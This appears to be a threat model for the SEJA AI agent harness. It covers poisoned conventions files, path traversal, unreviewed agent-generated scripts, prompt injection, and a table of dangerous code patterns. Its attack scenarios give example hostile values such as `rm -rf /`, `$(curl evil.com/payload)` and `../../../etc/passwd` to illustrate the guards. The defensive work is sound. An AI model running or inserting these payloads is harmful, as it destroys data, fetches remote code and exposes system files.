---
designer_description: "When you want to understand how SEJA defends itself against poisoned conventions files, path-escape attempts, unreviewed generated scripts, and prompt injection through user arguments, I'm the lightweight STRIDE-style threat model that names each trust boundary and injection vector, its severity and likelihood, the guard that mitigates it, and whether that guard is fully enforced or still partial."
---

# SEJA Harness Threat Model

Lightweight threat model for the SEJA agent harness. STRIDE-lite categories where applicable.

## Trust Boundaries

| Boundary | Inside (trusted) | Outside (untrusted) |
|---|---|---|
| B1 -- Conventions file | Harness code | User-authored `conventions.md` values |
| B2 -- Generated scripts | Reviewed & committed scripts | Freshly generated script output |
| B3 -- Agent subprompts | Skill SKILL.md definitions | Runtime user arguments |
| B4 -- File system | REPO_ROOT subtree | Paths outside REPO_ROOT |
| B5 -- Shell execution | Python subprocess calls with fixed args | Interpolated or user-supplied commands |

## Injection Vectors

| Vector | STRIDE | Severity | Likelihood | Mitigation | Status |
|---|---|---|---|---|---|
| V1 -- Shell metacharacters in conventions values | Tampering | High | Low | `_SHELL_INJECTION_RE` rejects backticks, `$(`, `$((` | Enforced |
| V2 -- Circular/missing `${var}` references | Denial of Service | Low | Medium | `_MAX_RESOLVE_PASSES=10` cap; post-resolve warning | Enforced |
| V3 -- Path traversal via `get_path()` | Information Disclosure | Medium | Low | `resolve()` + `relative_to(REPO_ROOT)` containment check | Enforced |
| V4 -- Unreviewed generated scripts | Elevation of Privilege | High | Medium | General guideline: display full script contents and request user confirmation before writing any generated script to disk | Enforced |
| V5 -- Prompt injection via user arguments | Spoofing | Medium | Medium | Skills receive arguments through structured frontmatter; no direct shell pass-through | Partial |
| V6 -- Malicious conventions.md in cloned repo | Tampering | Medium | Low | Shell-injection and path-traversal guards in `project_config.py` | Enforced |

## Attack Scenarios

| # | Scenario | Vectors | Mitigation |
|---|----------|---------|-----------|
| S1 | **Poisoned conventions.md** -- attacker contributes a value like `` `rm -rf /` `` or `$(curl evil.com/payload)` that later gets interpolated into a shell command. | V1, V6 | `_SHELL_INJECTION_RE` drops values containing backticks, `$(`, or `$((` at parse time, before they enter the resolved config dict. |
| S2 | **Path escape** -- a variable set to `../../../etc/passwd` causes `get_path()` to resolve outside REPO_ROOT, risking read/write of sensitive files. | V3 | `get_path()` resolves the candidate and verifies containment via `Path.relative_to(REPO_ROOT)`. Non-contained paths return `None` with a stderr warning. |
| S3 | **Unreviewed script execution** -- an agent-generated Python script containing hallucinated or malicious code is written to disk and executed. | V4 | General guideline: the agent must display full script contents and request explicit confirmation before writing to disk. |
| S4 | **Variable-resolution bomb** -- circular refs (`a=${b}`, `b=${a}`) cause the resolver to loop, hanging the process. | V2 | `_MAX_RESOLVE_PASSES=10` ensures termination; unresolved references after exhaustion trigger a warning. |

## Current Mitigations Summary

Guards below were all added in plan-000117 (script-generation confirmation also reinforced by plan-000152); `_MAX_RESOLVE_PASSES` is original.

| Component | Guard |
|---|---|
| `project_config._parse_config()` | Shell-injection regex filter |
| `project_config._parse_config()` | Unresolved-var warning after max passes |
| `project_config.get_path()` | Path containment within REPO_ROOT |
| General guideline (all script generation) | Mandatory user confirmation before write |
| `_MAX_RESOLVE_PASSES` | Iteration cap (10) for variable resolution |

## Generated Code Vulnerability Patterns

Patterns that agents and reviewers must check when generating/reviewing application code, organized by category. Each includes dangerous substrings, applicable languages, safe alternative, and severity. Fulfills Recommended Future Hardening #2 (below); the code-reviewer agent (`/.claude/agents/code-reviewer.md`) uses these for deterministic pre-scan before perspective evaluation.

### Injection

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `child_process_exec` | JS/TS | `child_process.exec`, `exec(`, `execSync(` | Use `execFile()` or `execFileSync()` -- prevents shell injection by not invoking a shell | HIGH |
| `eval_injection` | JS/TS | `eval(` | Use `JSON.parse()` for data, or alternative design patterns | HIGH |
| `new_function_injection` | JS/TS | `new Function` | Avoid dynamic code evaluation; use static alternatives | HIGH |
| `os_system_injection` | Python | `os.system`, `from os import system` | Use `subprocess.run()` with a list of arguments (no `shell=True`) | HIGH |
| `subprocess_shell` | Python | `subprocess.call(`, `subprocess.run(`, `subprocess.Popen(` with `shell=True` | Use `subprocess.run([cmd, arg1, arg2])` with argument list, never `shell=True` with user input | HIGH |
| `sql_string_concat` | Any | String concatenation or f-strings building SQL queries | Use parameterized queries / prepared statements | HIGH |
| `github_actions_workflow` | YAML (.github/workflows/) | `${{ github.event.issue.title }}`, `${{ github.event.pull_request.body }}` etc. in `run:` blocks | Use `env:` block with environment variables instead of direct interpolation | HIGH |

### Cross-Site Scripting (XSS)

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `react_dangerously_set_html` | JSX/TSX | `dangerouslySetInnerHTML` | Sanitize with DOMPurify, or use safe React components | HIGH |
| `document_write_xss` | JS/TS | `document.write` | Use `createElement()` and `appendChild()` | MEDIUM |
| `innerHTML_xss` | JS/TS | `.innerHTML =`, `.innerHTML=` | Use `textContent` for plain text, or sanitize HTML with DOMPurify | HIGH |
| `jinja2_autoescape_off` | Python (Jinja2) | `autoescape=False`, `Markup(` with user input | Keep `autoescape=True` (Flask default); use `|safe` filter only on trusted content | HIGH |

### Deserialization

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `pickle_deserialization` | Python | `pickle.load`, `pickle.loads`, `import pickle` | Use `json` or other safe serialization formats for untrusted data | HIGH |
| `yaml_unsafe_load` | Python | `yaml.load(` without `Loader=SafeLoader` | Use `yaml.safe_load()` or `yaml.load(data, Loader=SafeLoader)` | HIGH |
| `java_deserialization` | Java | `ObjectInputStream`, `readObject()` | Use JSON/protobuf; if Java serialization is required, use serialization filters | HIGH |

### Template Injection

| Pattern | Language | Dangerous Substrings | Safe Alternative | Severity |
|---------|----------|---------------------|------------------|----------|
| `ssti` | Python/JS | `render_template_string(` with user input, `Template(user_input)` | Never pass user input as the template itself; use template variables instead | HIGH |

## Complementary Tools

Anthropic's [`security-guidance` Claude Code plugin](https://github.com/anthropics/claude-code/tree/main/plugins/security-guidance) provides **pre-write interception** for 9 of the patterns above (PreToolUse hook on Edit/Write/MultiEdit). SEJA provides **post-write context-aware review** via the code-reviewer agent and SEC perspective. Install both for defense-in-depth: the plugin catches patterns deterministically pre-disk (zero-miss for covered patterns but cannot distinguish safe from unsafe uses), while SEJA's reviewer performs contextual triage (can distinguish test vs. production, intentional vs. accidental). The two operate at different layers; see advisory-000207 for the full evaluation.

## Recommended Future Hardening

1. **Allowlist for conventions values**: Instead of blocklisting shell metacharacters, define an allowlist regex (alphanumeric, hyphens, slashes, dots, commas) for convention values.
2. ~~**Content Security Policy for generated scripts**: Lint generated scripts for dangerous imports (`os.system`, `subprocess.Popen` with `shell=True`) before presenting to the user.~~ **Fulfilled** -- see "Generated Code Vulnerability Patterns" section above (plan-000209, advisory-000207).
3. **Subagent argument sanitization**: Add a shared sanitization step in `/pre-skill` that validates user arguments against type-specific patterns.
4. **Audit logging**: Log all rejected values and path escapes to a persistent audit file for post-incident analysis.
